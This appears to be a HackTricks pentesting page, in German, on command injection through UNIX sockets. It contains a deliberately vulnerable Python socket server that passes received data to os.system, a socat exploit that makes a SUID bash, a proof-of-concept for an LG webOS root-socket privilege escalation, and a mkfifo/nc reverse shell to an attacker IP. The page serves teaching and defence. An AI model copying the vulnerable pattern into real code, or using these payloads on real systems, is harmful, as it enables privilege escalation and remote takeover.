# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Beispiel für das Binden eines Sockets mit Python

Im folgenden Beispiel wird ein **unix socket erstellt** (`/tmp/socket_test.s`), und alles, was **empfangen** wird, soll von `os.system` **ausgeführt** werden. Ich weiß, dass du so etwas in freier Wildbahn nicht finden wirst. Ziel dieses Beispiels ist es jedoch, zu zeigen, wie Code aussieht, der unix sockets verwendet, und wie Eingaben im schlimmstmöglichen Fall verarbeitet werden.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Führen Sie** den Code mit Python aus: `python s.py` und **überprüfen Sie, wie der Socket lauscht**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Fallstudie: Signal-triggered escalation über einen Root-owned UNIX socket (LG webOS)

Einige privilegierte Daemons stellen einen Root-owned UNIX socket bereit, der nicht vertrauenswürdige Eingaben akzeptiert und privilegierte Aktionen mit Thread-IDs und Signalen verknüpft. Wenn das Protokoll es einem unprivilegierten Client ermöglicht, zu beeinflussen, welcher native Thread angesprochen wird, lässt sich möglicherweise ein privilegierter code path triggern und eine Privilege escalation durchführen.<sup>[[1]](#references)[[2]](#references)</sup>

Der primäre Write-up und die Offenlegung beschreiben die folgende Abfolge.<sup>[[1]](#references)[[2]](#references)</sup>

Beobachtetes Muster:
- Mit einem Root-owned socket verbinden (z. B. /tmp/remotelogger).
- Einen Thread erstellen und dessen native Thread-ID (TID) ermitteln.
- Die TID (gepackt) zusammen mit Padding als Request senden; eine Bestätigung empfangen.
- Ein bestimmtes Signal an diese TID senden, um das privilegierte Verhalten zu triggern.

Der verkürzte PoC unten bildet diese Abfolge nach.<sup>[[1]](#references)[[2]](#references)</sup>
Minimales PoC-Schema:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Um dies in eine Root-Shell umzuwandeln, kann ein einfaches Named-Pipe- + nc-Muster verwendet werden.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Hinweise:
- Diese Klasse von Bugs entsteht, wenn Werten vertraut wird, die aus dem Zustand eines nicht privilegierten Clients (TIDs) abgeleitet und an privilegierte Signal-Handler oder Logik gebunden werden.<sup>[[1]](#references)</sup>
- Härten Sie das System, indem Sie Credentials auf dem Socket erzwingen, Nachrichtenformate validieren und privilegierte Vorgänge von extern bereitgestellten Thread-Identifikatoren entkoppeln.

## References

- [1] [Jailbreak von webOS zum Spaß (wirklich nur zum Spaß)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV Path Traversal, Authentifizierungsumgehung und vollständige Geräteübernahme (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
